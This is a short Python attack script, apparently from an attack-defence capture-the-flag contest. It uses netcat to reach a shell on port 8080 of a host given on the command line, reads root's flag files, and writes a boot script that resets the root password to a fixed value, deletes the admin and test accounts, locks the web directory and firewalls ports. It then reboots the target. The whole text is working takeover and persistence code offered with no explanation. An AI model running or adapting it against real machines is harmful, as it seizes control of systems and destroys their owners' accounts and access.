#!/usr/bin/env python

import optparse
import pexpect

parser = optparse.OptionParser('usage%prog '+'-H <target host>')
parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
(options, args) = parser.parse_args()
host = options.tgtHost
a='nc '+str(host)+' 8080'
b='/home/NC.'+str(host)
child=pexpect.spawn(a)
fp8080=open(b,"wb")
child.logfile=fp8080
child.send("cat /root/flag*\r")
child.send("echo '#!/bin/sh'>/etc/rc.d/rc.local\r")
child.send("echo 'echo root:whd1q2w3e4r | chpasswd'>>/etc/rc.d/rc.local\r")
child.send("echo 'userdel admin'>>/etc/rc.d/rc.local\r")
child.send("echo 'userdel test'>>/etc/rc.d/rc.local\r")
child.send("echo 'chmod -R 700 /var/www'>>/etc/rc.d/rc.local\r")
child.send("echo 'iptables -A INPUT -p tcp --dport 1025: -j DROP'>>/etc/rc.d/rc.local\r")
child.send("reboot\r")
child.send("exit\r")
child.expect(pexpect.EOF)
fp8080.close()
